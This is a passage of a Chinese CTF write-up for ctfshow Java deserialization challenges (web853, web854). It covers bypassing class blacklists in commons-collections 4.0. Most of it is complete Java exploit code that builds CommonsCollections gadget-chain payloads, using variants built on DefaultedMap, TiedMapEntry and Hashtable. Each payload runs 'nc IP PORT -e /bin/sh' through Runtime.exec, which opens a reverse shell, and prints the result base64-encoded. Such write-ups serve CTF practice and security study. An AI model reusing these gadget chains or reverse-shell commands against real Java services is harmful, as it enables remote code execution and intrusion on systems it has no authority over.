class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"nc IP PORT -e /bin/sh"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">ObjecthashMap</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span><span class="token operator">&lt;</span><span class="token class-name">DefaultedMapconstructor</span> <span class="token operator">=</span> <span class="token class-name">DefaultedMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Transformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultedMap</span> defaultedMap <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">ObjecttiedMapEntry</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>defaultedMap<span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">ObjectexpHashMap</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> iTransformers <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-web853"><a href="#7-web853" class="headerlink" title="7. web853"></a>7. web853</h2><ul><li>题目描述</li></ul><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java8，使用了<strong>commons-collections 4.0</strong>的库并对一些可能有危险的类进行了封禁，<br>为了保证业务安全，我删除了nc和curl命令</p><p>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p><ul><li>题目解析</li></ul><p>上面的 payload 用不了了，再把 CC7 的修改一下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">DefaultedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"nc PORT IP -e /bin/sh"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span><span class="token operator">&lt;</span><span class="token class-name">DefaultedMapconstructor</span> <span class="token operator">=</span> <span class="token class-name">DefaultedMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Transformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">ObjecthashMap1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultedMap</span> defaultedMap1 <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        defaultedMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">ObjecthashMap2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultedMap</span> defaultedMap2 <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        defaultedMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hashtable</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Objecthashtable</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>defaultedMap1<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>defaultedMap2<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> iTransformers <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-web854"><a href="#8-web854" class="headerlink" title="8. web854"></a>8. web854</h2><ul><li>题目提示</li></ul><p>CC链之在野链1</p><ul><li>题目描述</li></ul><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java8，使用了<strong>commons-collections 4.0</strong>的库并对一些可能有危险的类进行了封禁，包含:</p><p>TransformedMapPriorityQueueInstantiateTransformerTransformingComparatorTemplatesImplAnnotationInvocationHandlerHashSetHashtableLazyMap</p><p>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p><ul><li>题目解析</li></ul><p>提示了为 CC在野链，找到了一篇<a href="https://www.anquanke.com/post/id/232415">参考文章</a>，回头复现一下</p><p>贴出 exp</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>bidimap<span class="token punctuation">.</span></span><span class="token class-name">DualLinkedHashBidiMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">DefaultedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"nc PORT IP -e /bin/sh"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span><span class="token operator">&lt;</span><span class="token class-name">DefaultedMapconstructor</span> <span class="token operator">=</span> <span class="token class-name">DefaultedMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Transformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">ObjecthashMap</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultedMap</span> defaultedMap <span class="token operator">=</span> 